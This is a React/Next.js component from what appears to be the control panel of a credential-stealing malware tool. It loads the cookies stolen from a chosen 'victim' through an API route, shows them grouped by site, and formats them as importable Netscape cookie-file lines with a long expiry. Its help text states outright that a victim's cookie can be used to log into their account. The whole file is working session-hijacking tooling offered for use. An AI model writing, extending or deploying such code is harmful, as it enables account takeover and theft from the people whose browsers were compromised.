import type { ICookies, ICookie } from '@/interfaces';
import { AnimationContainer } from '@/components';
import { fetcher } from '@/lib';
import { toast } from 'react-hot-toast';
import { useCopy } from '@/hooks';
import { useRouter } from 'next/router';
import { AiFillQuestionCircle } from 'react-icons/ai';
import { MdOutlineContentCopy } from 'react-icons/md';
import useSWR from 'swr';

export const Cookies = () => {
  const router = useRouter();
  const { data } = useSWR(`/api/victims/${router.query.id}/cookies`, fetcher);
  const [_, copy] = useCopy();
  const cookies: ICookies[] | null = data ? data : null;

  const onCopy = (cookies: ICookie[]) => {
    let result: string = '';
    cookies.forEach(
      (cookie: ICookie) => (result += `${cookie.origin}\tTRUE\t/\tFALSE\t2597573456\t${cookie.name}\t${cookie.value}\n`)
    );
    copy(result);
    toast.success('It has been copied successfully!');
  };

  return (
    <>
      <div className="px-3 py-2">
        <div className="px-3 py-2 rounded-md bg-white dark:bg-black border dark:border-[#111] border-gray-300">
          <h1 className="text-black dark:text-white font-base text-lg flex items-center">
            <AiFillQuestionCircle className="mr-1.5 text-blue-600" />
            What is a cookie?
          </h1>
          <p className="text-md text-gray-400">
            A cookie is information saved by your web browser, you can log into a website account using your
            victim&apos;s cookie.
          </p>
        </div>
      </div>
      <div className="px-3 py-2">
        {!cookies || (cookies.length < 1 && <p>No data!</p>)}
        {cookies?.map(({ name, cookies }: ICookies, index: number) => (
          <AnimationContainer key={index}>
            <div className="flex items-center flex-row w-full">
              <div className="mt-4 p-3 h-full w-full border dark:border-[#111] border-gray-300 rounded bg-gradient-to-tr dark:from-black from-[#f7f7f7] to-transparent">
                <div className="border-b dark:border-[#111] border-gray-300 flex p-2 items-center gap-4">
                  <h2 className="capitalize font-semibold text-sm">{name}</h2>
                </div>
                <div className="py-3 overflow-x-auto scroll-smooth snap-mandatory snap-x flex gap-4">
                  {cookies &&
                    cookies.map((data: ICookie, index: number) => (
                      <span
                        onClick={() => onCopy([data])}
                        key={index}
                        className="flex-shrink-0 w-[100px] block text-ellipsis overflow-hidden whitespace-nowrap dark:bg-[#0a0a0a] bg-white p-[10px] rounded-full border dark:border-[#111] border-gray-300 dark:hover:border-[#202020] hover:border-gray-500 cursor-pointer select-none text-xs"
                      >
                        {data.name}
                      </span>
                    ))}
                </div>
                <div className="h-40 w-full border dark:border-[#111] border-gray-300 overflow-x-hidden p-4">
                  <div className="flex items-center justify-end py-[10px] mb-4 w-full">
                    <div
                      onClick={() => onCopy(cookies)}
                      className="dark:bg-black bg-white p-[5px] flex items-center justify-center border dark:hover:border-white hover:border-black dark:border-[#111] border-gray-300 rounded cursor-pointer absolute"
                    >
                      <MdOutlineContentCopy />
                    </div>
                  </div>
                  <p className="text-[#888] break-all">
                    {cookies.map(
                      (data: ICookie) => `${name}\tTRUE\t/\tFALSE\t2597573456\t${data.name}\t${data.value}\n`
                    )}
                  </p>
                </div>
              </div>
            </div>
          </AnimationContainer>
        ))}
      </div>
    </>
  );
};
